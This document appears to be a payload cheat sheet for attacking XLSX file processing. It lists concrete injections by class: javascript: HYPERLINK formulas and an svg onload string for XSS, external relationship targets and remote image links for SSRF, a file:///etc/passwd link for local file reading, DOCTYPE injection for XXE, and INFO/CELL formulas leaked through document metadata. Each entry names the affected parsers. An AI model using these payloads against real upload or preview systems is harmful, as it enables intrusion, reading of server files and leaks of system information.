# Detailed XLSX Techniques

## XSS
1. **=HYPERLINK("javascript:alert(1)","click here")** - xl/worksheets/sheet1.xml - Excel Windows, Google Sheets, LibreOffice
2. **<xml><x><![CDATA[<svg onload=alert(1)>]]></x></xml> in customXml or sharedStrings** - customXml/item1.xml or xl/sharedStrings.xml - LibreOffice/OnlyOffice preview

## SSRF
1. **workbook.xml.rels → TargetMode="External"** - xl/_rels/workbook.xml.rels - POI, PhpSpreadsheet, EPPlus
2. **=HYPERLINK("http://…")** - xl/worksheets/sheet1.xml - All
3. **Images remote via drawing → blip r:link** - xl/drawings/drawing1.xml + rels - POI, EPPlus

## LFI
1. **=HYPERLINK("file:///etc/passwd")** - xl/worksheets/sheet1.xml - Excel, LibreOffice

## XXE
1. **sharedStrings.xml / workbook.xml DOCTYPE** - xl/sharedStrings.xml or workbook.xml - POI, PhpSpreadsheet (lxml)

## Info Disclosure
1. **CELL("filename")** - Cell + docProps/core.xml → dc:creator - Extracts the filename - The information appears in the document properties (Creator/Author)
2. **INFO("version")** - Cell + docProps/core.xml → dc:creator - Extracts Excel/Office version - Displays the version in the metadata
3. **INFO("system")** - Cell + docProps/core.xml → dc:creator - Extracts system information - Displays the system in the metadata
4. **NOW()** - Cell + docProps/core.xml → dc:creator - Extracts current date/time - Displays the date in the metadata
5. **INFO("directory")** - Cell + docProps/core.xml → dc:creator - Extracts the file directory - Displays the path in the metadata

**Note**: These payloads use Excel formulas in cells and modify the core.xml metadata to place formulas in dc:creator. After opening the file, check the document properties (right-click → Properties) to see the formula results in the Creator/Author field.

